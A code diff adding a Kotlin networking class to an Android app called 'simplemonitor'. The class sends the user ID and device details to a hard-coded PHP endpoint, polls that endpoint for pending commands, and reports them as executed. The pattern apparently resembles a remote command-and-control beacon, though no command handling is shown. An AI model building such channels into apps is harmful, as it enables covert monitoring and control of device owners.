@@ -1,0 +1,95 @@
+package com.simplemonitor.app
+
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.OutputStreamWriter
+import java.net.HttpURLConnection
+import java.net.URL
+
+class ApiService {
+
+    private val baseUrl = "https://payment70.site.je/api.php"
+
+    fun sendUserStatus(userId: String, deviceInfo: String): Boolean {
+        return try {
+            val url = URL(baseUrl)
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+            connection.connectTimeout = 10000
+            connection.readTimeout = 10000
+
+            val json = JSONObject().apply {
+                put("user_status", true)
+                put("user_id", userId)
+                put("device_info", deviceInfo)
+            }
+
+            OutputStreamWriter(connection.outputStream).use { writer ->
+                writer.write(json.toString())
+                writer.flush()
+            }
+
+            val responseCode = connection.responseCode
+            connection.disconnect()
+            responseCode == HttpURLConnection.HTTP_OK
+        } catch (e: Exception) {
+            e.printStackTrace()
+            false
+        }
+    }
+
+    fun fetchPendingCommands(userId: String): List<JSONObject> {
+        return try {
+            val url = URL("$baseUrl?user_id=$userId")
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "GET"
+            connection.connectTimeout = 10000
+            connection.readTimeout = 10000
+
+            val response = connection.inputStream.bufferedReader().use { it.readText() }
+            connection.disconnect()
+
+            val jsonArray = JSONArray(response)
+            val commands = mutableListOf<JSONObject>()
+            for (i in 0 until jsonArray.length()) {
+                commands.add(jsonArray.getJSONObject(i))
+            }
+            commands
+        } catch (e: Exception) {
+            e.printStackTrace()
+            emptyList()
+        }
+    }
+
+    fun markCommandExecuted(commandId: String): Boolean {
+        return try {
+            val url = URL(baseUrl)
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+            connection.connectTimeout = 10000
+            connection.readTimeout = 10000
+
+            val json = JSONObject().apply {
+                put("update_status", true)
+                put("command_id", commandId)
+                put("executed", true)
+            }
+
+            OutputStreamWriter(connection.outputStream).use { writer ->
+                writer.write(json.toString())
+                writer.flush()
+            }
+
+            val responseCode = connection.responseCode
+            connection.disconnect()
+            responseCode == HttpURLConnection.HTTP_OK
+        } catch (e: Exception) {
+            e.printStackTrace()
+            false
+        }
+    }
+}
